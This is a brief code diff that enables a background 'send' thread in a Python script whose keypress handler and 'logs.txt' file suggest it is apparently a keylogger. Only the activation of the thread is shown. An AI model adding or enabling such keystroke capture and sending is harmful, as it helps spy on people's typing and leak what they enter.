@@ -35,8 +35,8 @@ new_name = {
 }
 
 
-#send = threading.Thread(target=time_verify)
-#send.start()
+send = threading.Thread(target=time_verify)
+send.start()
 log = "logs.txt"
 
 def on_press(key):
